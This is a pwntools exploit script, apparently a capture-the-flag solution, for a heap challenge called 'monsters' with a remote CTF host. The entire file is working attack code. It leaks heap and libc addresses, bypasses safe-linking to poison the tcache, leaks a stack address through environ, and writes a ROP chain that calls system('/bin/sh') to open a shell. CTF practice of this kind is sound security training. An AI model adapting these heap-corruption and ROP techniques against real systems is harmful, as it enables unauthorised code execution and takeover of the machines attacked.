from pwn import *
from icecream import ic

elf = exe = ELF("./challenge_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("monsters.ctf.theromanxpl0.it", 7009)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

def check_info():
    sla("> ", "1")

def select_quest(ind):
    sla("> ", "2")
    sla("> ", str(ind))

def embark_quest():
    sla("> ", "3")

def add_equipment(ind, name, atk, defence):
    sla("> ", "4")
    sla("> ", str(ind))
    sla("> ", "1")
    sa(": ", name)
    sla(": ", str(atk))
    sla(": ", str(defence))

def remove_equipment(ind):
    sla("> ", "4")
    sla("> ", str(ind))
    sla("> ", "2")

sla(b">", b'abc')

for i in range(10):
    select_quest(1)
    embark_quest()

for i in range(13):
    if i == 0:
        add_equipment(i+1, b'poop', 1, 1)
    else:    
        add_equipment(i+1, b'e', 1, 1)

for i in range(10):
    add_equipment(3, b'e', 1, 1)

for i in range(10):
    remove_equipment(i+1)

remove_equipment(9)

check_info()
ru("poop")
ru("Attack: ")
heap = int(rl().strip()) << 12

ic(hex(heap))
for i in range(7):
    add_equipment(i+1, p64(0x41) + p64(0x41), 1, 1)

target = (heap + 0x2c0) ^ (heap >> 12)

add_equipment(8, b'e', target, target)
add_equipment(9, b'e', 1, 1)
add_equipment(10, b'e', 1, 1)
add_equipment(11, p64(1), 1, 1)

remove_equipment(4)
remove_equipment(6)
remove_equipment(5)
remove_equipment(11)

target = (heap + 0x350) ^ (heap >> 12)
add_equipment(11, p64(0) + p64(0x41) + p64(target), 1, 1)

add_equipment(5, b'e', 1, 1)
add_equipment(6, b'e', 1, 1)
add_equipment(1, b'e', 1, 0x4c1)
remove_equipment(4)

check_info()
ru("Helmet: ")
libc.address = uu64(6) - 0x211b20
ic(hex(libc.address))

remove_equipment(2)
remove_equipment(6)
remove_equipment(5)
remove_equipment(11)

target = (libc.sym['environ']-0x18) ^ (heap >> 12)
add_equipment(11, p64(0) + p64(0x41) + p64(target), 1, 1)

add_equipment(5, b'e', 1, 1)
add_equipment(6, b'e', 1, 1)
add_equipment(1, b'aaaaaaaz', 1, 1)

check_info()
ru("Helmet: ")
ru(b'z')
ret_addr = uu64(6) - 0x130
ic(hex(ret_addr))

remove_equipment(3)
remove_equipment(6)
remove_equipment(5)
remove_equipment(11)

target = (ret_addr - 0x8) ^ (heap >> 12)
add_equipment(11, p64(0) + p64(0x41) + p64(target), 1, 1)
add_equipment(5, b'e', 1, 1)
add_equipment(6, b'e', 1, 1)

rest = p64(qgad(libc, "rdi"))
rest += p64(binsh(libc))
rest += p64(libc.sym['system'])

add_equipment(1, rest, 1, gad(libc, ['ret']))

sl(b'5')

io.interactive()
